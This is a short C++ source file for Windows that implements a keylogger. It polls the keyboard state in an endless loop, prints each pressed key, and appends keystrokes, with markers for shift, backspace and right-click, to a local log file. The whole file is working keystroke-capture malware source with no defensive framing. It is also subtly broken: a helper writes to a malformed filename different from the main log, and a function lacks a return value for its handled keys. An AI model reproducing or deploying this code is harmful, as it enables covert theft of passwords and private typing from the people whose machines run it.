#include<iostream>
#include<Windows.h>
#include<fstream>
#include<stdlib.h>
#include<string>

using namespace std;



void WriteToLog(LPCSTR text) {
	ofstream logfile;
	logfile.open("KeyLogs txt:", fstream::app);
	logfile << text;
	logfile.close();
}
bool KeyIsListed(int iKey) {
	switch (iKey)
	{
		case VK_SPACE:
			cout << " ";
			WriteToLog(" ");
				break;

		case VK_RETURN:
				cout << "\n";
				WriteToLog("\n");
				break;

			case VK_SHIFT:
				cout << "*shift*";
				WriteToLog("*shift*");
				break;

			case VK_BACK:
				cout << "\b";
				WriteToLog("\b");
				break;
				 
			case VK_RBUTTON:
				cout << "*rclick*";
				WriteToLog("*rclick*");
				break;

			default: return false;//we need this later

	}



}

int main()
{
	char key;
	while (TRUE)
	{
		Sleep(10);
		for (key = 8; key <= 190; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (KeyIsListed(key) == FALSE) {
					cout << key;
					ofstream logfile;
					logfile.open("KeyLogs.txt",fstream::app);
					logfile << key;
					logfile.close();
				}
			}
		}
	}
	cin.get();
	return 0;
}



